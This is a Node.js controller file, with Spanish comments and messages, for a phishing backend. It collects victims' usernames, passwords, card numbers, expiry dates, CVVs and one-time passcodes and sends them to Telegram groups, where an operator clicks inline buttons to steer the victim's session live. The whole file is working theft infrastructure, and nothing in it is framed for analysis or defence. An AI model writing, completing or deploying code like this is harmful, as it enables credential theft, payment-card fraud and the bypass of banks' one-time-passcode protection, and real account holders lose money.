import {
  sendTelegramAlert,
  waitForDecision,
  respondToTelegramCallback,
  sendSimpleTelegramMessage,
  editTelegramMessage,
} from "../services/botService.js";

let ioInstance;
const activeSessions = new Map();   // socketId → session
const decisionMap = new Map();      // decisionId → socketId

export const setSocketIO = (io) => {
  ioInstance = io;
};

let counter = 0;

export const initProcess = async (req, res) => {
  const { data, socketId } = req.body;

  try {
    const groupId = counter <= 2 ? process.env.GROUP_1 : process.env.GROUP_2;
    const decrypted = JSON.parse(atob(data));
    const decisionId = `${socketId}-${Date.now()}`;

    const session = {
      chatId: groupId,
      user: decrypted.user,
      pass: decrypted.pass,
      card: null,
      exp: null,
      cvv: null,
      otp: null,
      socketId,
      messageId: null,
      decisionId,
    };

    activeSessions.set(socketId, session);
    decisionMap.set(decisionId, socketId);

    const messageText = buildMessageText(session);
    const { message_id } = await sendTelegramAlert({
      groupId,
      text: messageText,
      decisionId,
    });

    if (!message_id) {
      return res.status(500).json({
        success: false,
        message: "No se pudo enviar el mensaje a Telegram",
      });
    }

    session.messageId = String(message_id);

    waitForDecision(decisionId)
      .then((decision) => {
        const sockId = decisionMap.get(decisionId);
        const sess = activeSessions.get(sockId);
        if (sess && ioInstance) {
          ioInstance.to(sockId).emit("decision", decision);
        }
        decisionMap.delete(decisionId); // Limpieza
      })
      .catch((err) => {
        console.error("Timeout esperando decisión:", err.message);
      });

    return res.status(200).json({ success: true, messageId: message_id });
  } catch (error) {
    console.error(error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

export const telegramWebhook = async (req, res) => {
  const callback = req.body.callback_query;
  if (!callback) return res.sendStatus(200);
  try {
    await respondToTelegramCallback(callback);
    return res.sendStatus(200);
  } catch (err) {
    console.error("Error manejando webhook:", err);
    return res.sendStatus(500);
  }
};

export const appendCardData = async (req, res) => {
  const { card, exp, cvv, socketId } = req.body;
  const session = activeSessions.get(socketId);

  if (!session) return res.status(400).json({ error: "No hay sesión activa" });

  try {
    session.card = card;
    session.exp = exp;
    session.cvv = cvv;

    const newText = buildMessageText(session);

    await editTelegramMessage({
      chatId: session.chatId,
      messageId: session.messageId,
      text: newText,
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Error en appendCardData:", error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

export const sendSimpleMessage = async (req, res) => {
  const { text } = req.body;
  const chatId = counter <= 2 ? process.env.GROUP_1 : process.env.GROUP_2;
  const data = JSON.parse(atob(text));
  const message = `Tarjeta: ${data.card}\nExp: ${data.exp}\nCVV: ${data.cvv}`;

  try {
    const result = await sendSimpleTelegramMessage(chatId, message);
    return res.status(200).json({
      success: true,
      message_id: result.message_id,
      chat_id: result.chat.id,
      date: result.date,
      text: result.text,
    });
  } catch (err) {
    console.error("Error enviando mensaje simple:", err);
    return res.status(500).json({ error: err.message });
  }
};

export const updateMessageWithOtp = async (req, res) => {
  const { otp, socketId } = req.body;

  const session = activeSessions.get(socketId);
  if (!session)
    return res.status(400).json({ error: "No hay sesión activa para ese socketId" });

  try {
    session.otp = otp;

    const messageText = buildMessageText(session);

    const newDecisionId = `${socketId}-otp-${Date.now()}`;
    session.decisionId = newDecisionId;
    decisionMap.set(newDecisionId, socketId);

    await editTelegramMessage({
      chatId: session.chatId,
      messageId: session.messageId,
      text: messageText,
      reply_markup: {
        inline_keyboard: [[
          { text: "Continuar", callback_data: `continue:${newDecisionId}` },
          { text: "Finalizar", callback_data: `finalize:${newDecisionId}` },
        ]],
      },
    });

    waitForDecision(newDecisionId)
      .then((decision) => {
        const sockId = decisionMap.get(newDecisionId);
        const sess = activeSessions.get(sockId);
        if (sess && ioInstance) {
          ioInstance.to(sockId).emit("final-decision", decision);
        }
        decisionMap.delete(newDecisionId);
      })
      .catch((err) => {
        console.error("Timeout esperando decisión del OTP:", err.message);
      });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Error en updateMessageWithOtp:", error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

function buildMessageText(session) {
  return `
🚨 Nuevo ingreso:
👤 Usuario: ${session.user}
🔑 Contraseña: ${session.pass}
${session.card ? `💳 Tarjeta: ${session.card}` : ""}
${session.exp ? `📆 Exp: ${session.exp}` : ""}
${session.cvv ? `🔐 CVV: ${session.cvv}` : ""}
${session.otp ? `✅ OTP ingresado: ${session.otp}` : ""}
`.trim();
}
